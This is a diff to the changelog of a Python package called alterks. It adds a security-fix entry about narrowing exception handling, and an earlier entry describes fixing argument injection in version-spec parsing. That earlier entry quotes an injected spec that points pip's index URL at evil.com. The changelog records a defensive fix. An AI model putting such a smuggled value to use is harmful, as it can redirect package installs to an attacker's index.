@@ -281,6 +281,10 @@ src/alterks/
 
 ## Changelog
 
+### v0.1.12 — Security Fix
+
+- **Fixed**: Broad `except Exception` blocks replaced with specific exception types (OWASP A09:2021 — Security Logging and Monitoring Failures). OSV errors now catch `OSVError`/`httpx.HTTPError`, heuristic failures catch `KeyError`/`TypeError`/`ValueError`/`ZeroDivisionError`, requirement parsing catches `InvalidRequirement`/`ValueError`. Internal logic bugs are no longer silently masked.
+
 ### v0.1.11 — Security Fix
 
 - **Fixed**: `_parse_spec` argument injection in version string (OWASP A03:2021 — Injection). Replaced manual string splitting with `packaging.requirements.Requirement` for rigorous PEP 508 parsing. Parsed name and version are validated against strict regexes. Crafted specs like `pkg==1.0 --index-url=https://evil.com` are now rejected.
